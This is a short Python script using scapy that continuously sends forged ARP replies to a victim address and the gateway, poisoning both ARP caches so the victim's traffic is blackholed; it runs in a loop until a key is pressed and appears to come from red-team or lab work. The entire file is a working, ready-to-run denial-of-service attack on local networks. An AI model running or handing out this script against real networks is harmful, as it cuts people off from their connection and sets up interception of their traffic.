import time
import keyboard
from scapy.all import send
from scapy.layers.l2 import ARP


def continuous_arp_dos(
        victim_ip: str = "192.168.1.194",
        gateway_ip: str = "192.168.1.1",
        attacker_mac: str = "88:AE:DD:5D:88:22",
        iface: str = None,
        interval: float = 2.0
):
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)

    print(f"[RED] Starting continuous ARP blackhole loop targeting {victim_ip} <-> {gateway_ip}")
    print(f"[RED] Press 'p' to stop.")

    while True:
        # Check if 'p' is pressed to break the loop
        if keyboard.is_pressed('p'):
            print("\n[+] Stopped by user.")
            break

        send(pkt_to_victim, iface=iface, verbose=False)
        send(pkt_to_gateway, iface=iface, verbose=False)
        time.sleep(interval)


if __name__ == "__main__":
    continuous_arp_dos()